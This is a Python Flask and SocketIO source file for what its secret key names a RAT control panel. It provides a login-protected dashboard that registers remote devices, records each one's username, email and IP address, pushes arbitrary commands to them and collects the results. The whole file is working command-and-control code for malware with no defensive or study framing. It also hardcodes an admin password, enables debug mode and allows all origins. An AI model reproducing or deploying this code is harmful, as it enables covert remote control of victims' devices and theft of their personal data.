import os
import json
import time
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.secret_key = "vanzzz_rat_secret_key_2026"
socketio = SocketIO(app, cors_allowed_origins="*")

# ==================== DATA STORAGE ====================
DEVICES = {}
COMMANDS = {}
ADMIN_USER = {"username": "Admin", "password": "Vanzzz13"}

# ==================== ROUTES ====================
@app.route('/')
def index():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    return render_template('dashboard.html', devices=DEVICES)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USER['username'] and password == ADMIN_USER['password']:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return render_template('login.html', error="Username atau password salah!")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/device/<device_id>')
def device_control(device_id):
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    device = DEVICES.get(device_id, {})
    return render_template('device_control.html', device=device, device_id=device_id)

@app.route('/api/devices')
def get_devices():
    return jsonify(DEVICES)

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    device_id = data.get('device_id')
    if device_id and device_id in DEVICES:
        DEVICES[device_id]['last_seen'] = datetime.now().isoformat()
        DEVICES[device_id]['status'] = 'online'
    return jsonify({"status": "ok"})

@app.route('/api/register', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('device_id')
    name = data.get('name', 'Unknown')
    username = data.get('username', '')
    email = data.get('email', '')
    
    DEVICES[device_id] = {
        "name": name,
        "username": username,
        "email": email,
        "ip": request.remote_addr,
        "last_seen": datetime.now().isoformat(),
        "status": "online"
    }
    COMMANDS[device_id] = []
    
    # SEND VIA SOCKET
    socketio.emit('device_registered', {'device_id': device_id, 'name': name})
    
    return jsonify({"status": "ok"})

@app.route('/api/device/<device_id>/commands', methods=['GET'])
def get_commands(device_id):
    if device_id not in COMMANDS:
        COMMANDS[device_id] = []
    return jsonify(COMMANDS[device_id])

@app.route('/api/device/<device_id>/command', methods=['POST'])
def send_command(device_id):
    if 'logged_in' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    command = request.json.get('command')
    data = request.json.get('data', {})
    
    if device_id not in COMMANDS:
        COMMANDS[device_id] = []
    
    cmd = {
        "id": str(int(time.time() * 1000)),
        "command": command,
        "data": data,
        "timestamp": datetime.now().isoformat(),
        "status": "pending"
    }
    COMMANDS[device_id].append(cmd)
    
    # KIRIM VIA SOCKET
    socketio.emit('new_command', {'device_id': device_id, 'command': cmd}, room=device_id)
    
    return jsonify({"success": True, "command": cmd})

@app.route('/api/device/<device_id>/response', methods=['POST'])
def device_response(device_id):
    data = request.json
    cmd_id = data.get('command_id')
    result = data.get('result')
    
    if device_id in COMMANDS:
        for cmd in COMMANDS[device_id]:
            if cmd['id'] == cmd_id:
                cmd['status'] = 'completed'
                cmd['result'] = result
                break
    
    return jsonify({"success": True})

# ==================== SOCKET EVENTS ====================
@socketio.on('connect')
def handle_connect():
    print(f"[+] Client connected: {request.sid}")

@socketio.on('register_device')
def handle_register(data):
    device_id = data.get('device_id')
    name = data.get('name', 'Unknown')
    username = data.get('username', '')
    email = data.get('email', '')
    
    DEVICES[device_id] = {
        "name": name,
        "username": username,
        "email": email,
        "ip": request.remote_addr,
        "last_seen": datetime.now().isoformat(),
        "status": "online"
    }
    COMMANDS[device_id] = []
    
    socketio.server.enter_room(request.sid, device_id)
    socketio.emit('device_registered', {'device_id': device_id, 'name': name})
    print(f"[+] Device registered: {device_id} ({name})")

@socketio.on('device_heartbeat')
def handle_heartbeat(data):
    device_id = data.get('device_id')
    if device_id in DEVICES:
        DEVICES[device_id]['last_seen'] = datetime.now().isoformat()
        DEVICES[device_id]['status'] = 'online'

@socketio.on('disconnect')
def handle_disconnect():
    print(f"[-] Client disconnected: {request.sid}")

# ==================== RUN ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, debug=True)
